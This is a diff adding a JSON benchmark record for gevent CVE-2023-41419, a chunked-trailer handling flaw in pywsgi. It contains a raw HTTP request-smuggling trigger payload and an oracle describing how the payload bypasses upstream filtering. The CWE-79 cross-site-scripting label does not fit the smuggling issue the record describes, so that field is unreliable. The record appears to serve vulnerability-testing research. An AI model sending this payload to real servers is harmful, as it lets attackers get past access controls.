@@ -1,0 +1,15 @@
+{
+  "file_id": "128_gevent_issue_1989",
+  "numeric_id": "128",
+  "library_hint": "gevent",
+  "source": "github_issue",
+  "title": "Improper handling of invalid trailers in chunked requests on keep-alive connections in gevent.pywsgi.WSGIServer",
+  "cve": "CVE-2023-41419",
+  "cwe": "CWE-79: Improper Neutralization of Input During Web Page Generation (Cross Site Scripting)",
+  "library": "gevent",
+  "affected_version": "< 23.9.0",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "POST /path1 HTTP/1.1\nHost: a.com\nTransfer-Encoding: chunked\nConnection: keep-alive\n2\na2\n0\nHeader: value\nPOST /path2?a=:123 HTTP/1.1\nHost: a.com\nConnection: close",
+  "oracle": "The second request bypasses upstream server checks due to improperly handled trailers, allowing unauthorized access to paths or headers that should have been filtered."
+}
